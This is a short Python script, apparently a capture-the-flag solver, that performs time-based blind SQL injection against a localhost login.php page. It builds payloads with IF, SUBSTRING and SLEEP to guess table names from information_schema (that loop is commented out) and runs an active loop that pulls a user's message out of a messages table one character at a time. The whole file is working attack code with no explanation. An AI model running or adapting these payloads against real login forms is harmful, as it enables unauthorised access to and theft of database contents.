from requests import get


table_guessing_patern = "' or if((select SUBSTRING(table_name,{},1) from information_schema.tables where table_schema=database() limit {},1)='{}', sleep({}), null)-- "

error = None
sleepingTime = 3
tables = [
    "users",
    "messages"
]
tableIndex = 0

# while error is None:
#     tableNameEnded = False
#     i = 1
#     tableName = ""
#     while not tableNameEnded:
#         for ascii in range(32, 127):
#             print("Trying: {} ({})".format(chr(ascii), ascii))
#             payload = table_guessing_patern.format(i, tableIndex, chr(ascii), sleepingTime)
#             r = post('http://localhost/login.php', data={
#                 "username": payload,
#                 "password": ""
#             })
#             if r.elapsed.total_seconds() >= sleepingTime:
#                 if (tableName + chr(ascii)).strip() == tableName:
#                     tableNameEnded = True
#                     break

#                 tableName += chr(ascii)
#                 print("Found: {}".format(tableName))
#                 break
#             if ascii == 126:
#                 tableNameEnded = True
#         i += 1
#     if tableName == "":
#         error = True
#         break
#     print("Found table: {}".format(tableName))
#     tables.append(tableName)
#     tableIndex += 1

data_extraction_patern = "' or if((select SUBSTRING(message,{},1) from messages where user_id=1 limit 0,1)='{}', sleep({}), null)-- "

flag = ""
i = 1
while True:
    for ascii in range(32, 127):
        print("Trying: {} ({})".format(chr(ascii), ascii))
        payload = data_extraction_patern.format(i, chr(ascii), sleepingTime)
        r = get('http://localhost/login.php?username={}&password={}'.format(payload,""))
        if r.elapsed.total_seconds() >= sleepingTime:
            flag += chr(ascii)
            print("Found: {}".format(flag))
            break
        if ascii == 126:
            print("Found flag: {}".format(flag))
            exit()
    i += 1